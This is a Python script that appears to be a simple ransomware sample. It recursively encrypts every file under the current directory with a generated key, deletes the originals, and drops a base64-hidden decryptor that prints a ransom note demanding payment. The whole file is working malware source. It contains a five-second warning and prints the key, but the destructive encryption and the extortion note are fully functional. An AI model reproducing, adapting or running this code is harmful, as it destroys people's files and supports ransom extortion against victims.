#!/usr/bin/python3

import os
import sys
import base64
from time import sleep
from cryptography.fernet import Fernet

dec = "IyEvdXNyL2Jpbi9weXRob24zCgppbXBvcnQgc3lzCmltcG9ydCBvcwpmcm9tIGNyeXB0b2dyYXBoeS5mZXJuZXQgaW1wb3J0IEZlcm5ldCxJbnZhbGlkVG9rZW4KCmRlZiB1c2FnZSgpOgogICAgcHJpbnQoIk9vb3BzLCB5b3VyIGltcG9ydGFudCBmaWxlcyBhcmUgZW5jcnlwdGVkISIpCiAgICBwcmludCgpCiAgICBwcmludCgiSWYgeW91IHNlZSB0aGlzIHRleHQsIHRoZW4geW91ciBmaWxlcyBhcmUgbm8gbG9uZ2VyIGFjY2Vzc2libGUsIikKICAgIHByaW50KCJiZWNhdXNlIHRoZXkgaGF2ZSBiZWVuIGVuY3J5cHRlZC4gUGVyaGFwcyB5b3UgYXJlIGJ1c3kgbG9va2luZyIpCiAgICBwcmludCgiZm9yIGEgd2F5IHRvIHJlY292ZXIgeW91ciBmaWxlcywgYnV0IGRvbid0IHdhc3RlIHlvdXIgdGltZS4iKQogICAgcHJpbnQoIk5vYm9keSBjYW4gcmVjb3ZlciB5b3VyIGZpbGVzIHdpdGhvdXQgb3VyIGRlY3J5cHRpb24gc2VydmljZS4iKQogICAgcHJpbnQoIldlIGd1YXJhbnRlZSB0aGF0IHlvdSBjYW4gcmVjb3ZlciBhbGwgeW91ciBmaWxlcyBzYWZlbHkgYW5kIikKICAgIHByaW50KCJlYXNpbHkuIEFsbCB5b3UgbmVlZCB0byBkbyBpcyBzdWJtaXQgdGhlIHBheW1lbnQgYW5kIHB1cmNoYXNlIikKICAgIHByaW50KCJ0aGUgZGVjcnlwdGlvbiBrZXkuIikKICAgIHByaW50KCkKCiAgICAjIFBsYWNlIHdoYXRldmVyIHRleHQgaGVyZQoKICAgIHByaW50KCJUbyBkZWNyeXB0LCBtYWtlIHN1cmUgYWxsIHRoZSBlbmNyeXB0ZWQgZmlsZXMgaGF2ZSB0aGUgLkZGMDAwMCBleHRlbnNpb24sIGluIHRoZSBzYW1lIikKICAgIHByaW50KCJkaXJlY3RvcnkgYXMgdGhlIGRlYy5weSB0b29sLCB0aGVuIGludm9rZSB0aGlzIGRlY3J5cHRpb24gdG9vbCBsaWtlIHNvOiBweXRob24gZGVjLnB5IC0ta2V5PVlvVVJzMG9wM3JzM2NyM1RLRXlGaWxlIikKICAgIHByaW50KCJNYWtlIHN1cmUgeW91IHVzZSB0aGUgcmlnaHQga2V5ISBCQUNLIFVQIFRIRSBFTkNSWVBURUQgRklMRVMgQkVGT1JFIERPSU5HIEFOWVRISU5HISIpCiAgICBwcmludCgidGFyIC1jdnpmIGJhY2t1cC50Z3ogLi8qLkZGMDAwMCAmJiBtdiBiYWNrdXAudGd6IC90bXAiKQogICAgc3lzLmV4aXQoMSkKCmRlZiBmaWxlcyhwYXRoKToKICAgIHJldGZpbGVzID0gW10KICAgIGZvciByb290LCBkaXJzLCBmaWxlX29iaiBpbiBvcy53YWxrKHBhdGgpOgogICAgICAgIGZvciBmIGluIGZpbGVfb2JqOgogICAgICAgICAgICByZXRmaWxlcy5hcHBlbmQob3MucGF0aC5qb2luKHJvb3QsIGYpKQogICAgcmV0dXJuIHJldGZpbGVzCgpkZWYgbWFpbihrKToKICAgIGJhZGZpbGVzID0gWyJlbmMucHkiLCAia2V5Iiwgb3MucGF0aC5iYXNlbmFtZShfX2ZpbGVfXyldCiAgICB0cnk6CiAgICAgICAga2V5ID0gay5lbmNvZGUoKQogICAgICAgIGZlcm5ldCA9IEZlcm5ldChrZXkpCiAgICBleGNlcHQgVmFsdWVFcnJvcjoKICAgICAgICBwcmludCgiV3Jvbmcga2V5IGxlbmd0aD8iKQogICAgICAgIHN5cy5leGl0KDEpCiAgICAjIGtleSBuZWVkcyB0byBiZSBhIGJ5dGVzdHJpbmcKCiAgICBwcmludCgiRGVjcnlwdGluZy4uLiIpCiAgICBmaWxlbGlzdCA9IGZpbGVzKCIuIikKICAgIGZvciBvYmogaW4gZmlsZWxpc3Q6CiAgICAgICAgaWYgIi5GRjAwMDAiIG5vdCBpbiBvYmo6CiAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgaWYgb2JqIGluIGJhZGZpbGVzOgogICAgICAgICAgICBjb250aW51ZQogICAgICAgIHdpdGggb3BlbihvYmosICdyYicpIGFzIGY6CiAgICAgICAgICAgIGRhdGEgPSBmLnJlYWQoKQogICAgICAgIHRyeToKICAgICAgICAgICAgZGVjcnlwdGVkID0gZmVybmV0LmRlY3J5cHQoZGF0YSkKICAgICAgICBleGNlcHQgSW52YWxpZFRva2VuOgogICAgICAgICAgICBwcmludCgiV1JPTkcgS0VZISBET04nVCBHVUVTUyEiKQogICAgICAgICAgICBzeXMuZXhpdCgxKQogICAgICAgIGZpbGVuYW1lID0gb2JqWzotN10KICAgICAgICB3aXRoIG9wZW4oZmlsZW5hbWUsICd3YicpIGFzIGY6CiAgICAgICAgICAgIGYud3JpdGUoZGVjcnlwdGVkKQogICAgICAgIG9zLnJlbW92ZShvYmopCgogICAgcHJpbnQoIllvdXIgZmlsZXMgc2hvdWxkIGJlIGRlY3J5cHRlZCBub3chIikKICAgIHByaW50KCJUaGFuayB5b3UgZm9yIHBheWluZyB5b3VyIHJhbnNvbSEiKQoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIGlmIGxlbihzeXMuYXJndikgIT0gMjoKICAgICAgICB1c2FnZSgpCiAgICBlbHNlOgogICAgICAgIGlmICItLWtleT0iIGluIHN5cy5hcmd2WzFdOgogICAgICAgICAgICAoanVuaywga2V5KSA9IHN5cy5hcmd2WzFdLnNwbGl0KCI9IiwgMSkKICAgICAgICAgICAgbWFpbihrZXkpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgdXNhZ2UoKQoK"

#def files(path):
#    for obj in os.listdir(path):
#        if os.path.isfile(os.path.join(path, obj)):
#            yield obj

def files(path):
    retfiles = []
    for root, dirs, file_obj in os.walk(path):
        for f in file_obj:
            retfiles.append(os.path.join(root, f))
    return retfiles

def main():
    dontdec = ["./key", "./%s" % os.path.basename(__file__)]
    key = Fernet.generate_key()
    fernet = Fernet(key)

    sys.stdout.write("About to encrypt the contents of this entire directory!\n")
    sys.stdout.write("INCLUDING ALL SUBDIRECTORIES!\n")
    sys.stdout.write("If this is something you DON'T want, hit CTRL-C within the next 5 seconds!\n")
    sleep(5)

    sys.stdout.write("\nSave this key, IT WILL NOT BE REPEATED!: %s\n" % key.decode())
    sys.stdout.flush()
    filelist = files(".")
    for obj in filelist:
        # For all files in this current directory
        # except this one of course!
        if obj in dontdec:
            continue
        with open(obj, 'rb') as f:
            data = f.read()
        sys.stdout.write("\rSTATUS: Encrypting - " + " "*50)
        sys.stdout.write("\rSTATUS: Encrypting - %s" % obj)
        sys.stdout.flush()
        encrypted = fernet.encrypt(data)
        with open("%s.FF0000" % obj, 'wb') as f:
            f.write(encrypted)
        # now delete the original
        os.remove(obj)

    # now write the dec.py file
    with open("dec.py", 'wb') as f:
        f.write(base64.b64decode(dec))
    os.chmod("./dec.py", 0o755)
    sys.stdout.write("\nDone! Now delete the wanna.py file!\n")

if __name__ == '__main__':
    main()
